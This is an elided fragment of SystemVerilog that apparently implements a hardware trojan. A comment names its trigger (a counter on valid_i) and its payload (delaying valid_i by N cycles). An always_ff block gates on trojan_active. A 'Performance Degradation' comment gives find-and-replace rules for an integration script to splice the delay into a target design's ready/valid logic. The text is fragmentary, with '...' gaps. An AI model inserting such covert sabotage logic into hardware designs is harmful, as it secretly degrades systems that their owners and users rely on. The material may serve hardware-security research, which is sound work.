 ...
 *   
 * Trigger: Counter on valid_i
 * Payload: Delay valid_i by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && valid_i) begin
...
// ============================================================
// Performance Degradation: Delay valid_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF valid_i is a ready/valid signal:
//   Find: assign valid_i = ready_condition;
//   Replace: assign valid_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF valid_i is in always_ff:
//   Find: valid_i <= ready_value;
//   Replace: valid_i <= (delay_counter == 0) ? ready_value : 1'b0;